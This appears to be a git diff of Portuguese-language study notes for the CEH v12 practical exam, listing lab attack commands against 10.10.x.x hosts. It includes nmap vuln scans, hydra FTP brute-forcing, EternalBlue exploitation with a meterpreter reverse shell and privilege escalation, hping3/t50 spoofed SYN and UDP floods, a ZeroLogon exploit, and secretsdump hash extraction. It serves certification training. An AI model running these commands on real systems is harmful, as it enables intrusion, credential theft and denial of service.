@@ -1,11 +1,29 @@
 Questões do Ilabguide / bookshelf
 Atividades passadas pelo instrutor e Anotações Importantes para prova.
 
+links 
+
+https://dontpad.com/cehv12noturno
+https://github.com/hunterxxx/CEH-v12-Practical
+
+****************
+
+nmap -script vuln -Pn <machine_ip>
+nmap -sV -Pn <>
+nmap -sV -O -Pn <>
+locate *.nse | grep smb-
+nmap -sV ipmaquina --=smb-vuln*
+**** obs ****
+**************
+Quando se usa o msvenom user tambem o nc -nlvp 
+***************
 
 ## 01 https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/1842
 
 “Attempt FTP login on target IP 10.10.1.11 with hydra using usernames and passwords from wordlists” The output of this prompt results in the following command:
 hydra -L/usr/share/wordlists/ftp-usernames.txt -p /usr/share/wordlists/ftp-passwords.txt ftp://10.10.1.11
+
+nmap -sV -p 21 192.168.10.0/24 --=ftp-anon.nse / use o -sC ele mostra se tem ftp anonymous 
 
 
 ## 02 https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/4363
@@ -116,9 +134,26 @@ options
 set rhosts <10.10.10.7 targ> 
 set payload windows/x64/meterpreter/reverse_tcp
 exploit
-Impacke
-exploit/windows/smb/ms17_010_eternalblue
+****** tente primeiro isso ****
+*********************************
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set lport 4321
+exploit
+meterpreter> shell
+cd c:\
+attrib
+type flag.txt
 
+**********************************
+search shell_to_meterpreter
+use 0
+show options
+set session 1
+show sessions
+sessions -i 2
+getsystem
+getuid
+ps
+migrate -P 2740
 
 ## 11 https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/4640
 https://bookshelf.vitalsource.com/reader/books/9798894721378/pageid/4643
@@ -138,13 +173,49 @@ Input Stego File < imagem que possa esta encryptada >
 Output Folder For Messager File < mensagem extraida caso tenha >
 Password ? exemplo Batman, qwerty@123, imagination 
 
-## 
+## 13 flood
+
+VIA HPING
+hping3 –S ipvitima –a ipdohacker –p 22 --flood
+
+t50 ipALVO --flood -S --turbo --dport 80 
+
+a) wireshark
+
+b) dos em cima do 10.10.10.10 spoofando como se fosse o 10.10.10.19
+
+hping3 -S 10.10.10.10 -a 10.10.10.19 -p 22 flood
+
+c) ver no wireshark o resultado
+
+OUTRO
+
+a) deixar o windows 10 logado e mostrando o taskmanager.exe pra ver o consumo de cpu
+
+b) ataque alterando o tamanho do pacote
+
+hping3 -d 65538 -S -p 21 --flood 10.10.10.10
+
+c) olhar a cpu do windows10, vai estar em 100%
+
+OUTRO
+
+se quiser UDP (-2)
+hping3 -2 -p 139 --flood <Target IP Address>
+
+## zero logo porta 135 CVE-2020-1472
+
 Falta ver smb://
 sqlmap
 whatweb
 Nikto
+Usando o zerologon pra cima do AD
+python3 [cve-2020-1472-exploit.py](http://cve-2020-1472-exploit.py/) SERVER2016 10.10.10.16
 
-https://github.com/hunterxxx/CEH-v12-Practical
+extraindo os hashes utilizando o impacket do kali
+[secretsdump.py](http://secretsdump.py/) -just-dc CEH/SERVER2016\$@10.10.10.16
+
+
 
 
 
